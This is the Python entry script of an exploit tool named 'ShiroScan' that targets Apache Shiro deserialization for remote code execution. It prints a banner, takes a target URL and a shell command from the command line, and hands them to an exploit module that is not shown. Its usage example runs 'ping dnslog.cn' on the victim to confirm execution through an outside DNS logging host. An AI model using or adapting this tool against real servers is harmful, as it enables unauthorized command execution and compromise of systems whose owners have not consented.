# -*- coding: utf-8 -*-
# 
import sys

from moule.main import scripts

banner='''
 ____  _     _          ____                  
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __  
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \ 
 ___) | | | | | | | (_) |__) | (_| (_| | | | |
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|

                           By 斯文
'''


print(banner)
print('Welcome To Shiro反序列化 RCE ! ')

if __name__ == '__main__':
    if len(sys.argv)<2:
        print("Usage:"+"python3 shiro.py  url  command")
        print("Usage:"+"若import模块错误，安装不成功，请到linux系统安装运行，或者去python库将crypto首字母改为大写并尝试pip install pycryptodome")
        print('Usage：python3 shiro.py  http://url.com  "ping dnslog.cn"   注意命令用""包起来')
    else:
        url = sys.argv[1]
        command = sys.argv[2]
        scripts(url, command)
    
